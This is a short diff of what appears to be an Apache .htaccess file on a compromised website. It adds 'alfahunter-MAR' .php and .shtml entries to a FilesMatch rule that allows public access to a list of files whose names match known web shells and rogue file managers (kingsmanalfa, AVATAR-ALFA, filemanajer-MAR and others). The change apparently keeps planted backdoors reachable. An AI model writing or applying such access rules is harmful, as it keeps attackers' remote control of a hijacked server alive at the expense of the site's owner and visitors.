@@ -58,7 +58,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(kingsmanalfa.ShTmL|ANAK-SEKOLAH.2.sHTmL|ANAK-SEKOLAH.3.ShtML|dpr(2).sHTmL|CHIP-JKT-UPLOADS.sHTmL|AVATAR-ALFA(2).ShTMl|anaksekolabisanih-MAR.php|filemanajer-MAR.php|ANAK-SEKOLAH-MAR.ShTmL|STILL-ALIVE-MAR.sHtML|kingsmanalfa-MAR.php)$">
+<FilesMatch "^(alfahunter-MAR.ShTML|kingsmanalfa.ShTmL|ANAK-SEKOLAH.2.sHTmL|ANAK-SEKOLAH.3.ShtML|dpr(2).sHTmL|CHIP-JKT-UPLOADS.sHTmL|AVATAR-ALFA(2).ShTMl|anaksekolabisanih-MAR.php|filemanajer-MAR.php|ANAK-SEKOLAH-MAR.ShTmL|STILL-ALIVE-MAR.sHtML|kingsmanalfa-MAR.php|alfahunter-MAR.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
